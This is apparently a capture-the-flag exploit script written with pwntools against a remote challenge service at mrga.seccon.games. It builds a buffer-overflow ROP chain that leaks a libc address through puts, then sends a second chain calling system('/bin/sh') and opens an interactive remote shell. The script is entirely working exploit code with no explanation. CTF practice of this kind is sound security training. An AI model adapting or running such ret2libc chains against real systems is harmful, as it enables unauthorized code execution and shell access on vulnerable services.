from pwn import *
from ctftools.pwn.common import connect

exe = ELF("chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("libc.so.6")
# nc mrga.seccon.games 7428
io = connect(exe, "mrga.seccon.games", 7428)

rop = ROP(exe)
offset = cyclic_find('gaaa')
payload = flat(
    bytes(offset),
    pack(exe.plt.gets),
    pack(exe.plt.puts),
    pack(exe.symbols.main),
)

# for proof of work
# io.interactive()
io.sendline(payload)
io.sendline(b'XXXX')
io.recvuntil(b'XXXX')
print(hex(int.from_bytes(io.recv(4), 'little')))
libc_leak = int.from_bytes(io.recv(6), 'little')
libc.address = libc_leak - 0x75ec57da1740 + 0x75ec57da4000
print(f"libc_leak: {hex(libc_leak)}")

print(hex(libc.symbols.system))

rop = ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
payload = flat(
    bytes(offset),
    rop.chain()
)
io.sendlineafter(b'>', payload)
io.interactive()
